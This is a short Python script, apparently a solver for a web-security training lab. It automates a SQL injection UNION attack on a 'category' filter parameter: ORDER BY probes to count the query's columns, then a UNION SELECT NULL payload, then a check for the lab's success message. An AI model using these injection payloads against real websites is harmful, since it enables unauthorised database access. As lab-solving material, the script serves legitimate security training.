import requests
from colorama import Fore, Style, init
import sys


class LabSolver:
    def __init__(self, lab_url):
        self.lab_url = lab_url if lab_url.endswith('/') else lab_url + '/'
        self.session = requests.Session()
        init()
        self.number_of_columns = None

    def check_number_of_columns(self):
        payload = 'filter?category=Lifestyle\' ORDER BY {}--'
        for i in range(10):
            temp_payload = payload.format(i+1)
            response = self.session.get(self.lab_url + temp_payload)
            if response.status_code == 200:
                print(Fore.RED + '[-]' + Style.RESET_ALL + ' ORDER BY ' + str(i+1))
            else:
                print(Fore.GREEN + '[+]' + Style.RESET_ALL + ' ORDER BY ' + str(i + 1))
                self.number_of_columns = i
                break

    def inject_union_attack(self):
        nulls = ''
        for i in range(self.number_of_columns):
            nulls += 'NULL, '
        payload = 'filter?category=Lifestyle\' UNION SELECT {}'.format(nulls).rstrip(', ') + '--'
        self.session.get(self.lab_url + payload)

    def check_solution(self):
        response = self.session.get(self.lab_url)
        if 'Congratulations, you solved the lab!' in response.text:
            print('You solved the lab.')
            print('Coded by Mohamed Ahmed (ma4747gh).')
            print('My GitHub account: https://github.com/ma4747gh')
            print('My LinkedIn account: https://eg.linkedin.com/in/ma4747gh')

    def solve(self):
        self.check_number_of_columns()
        self.inject_union_attack()
        self.check_solution()


solver = LabSolver(sys.argv[1])
solver.solve()
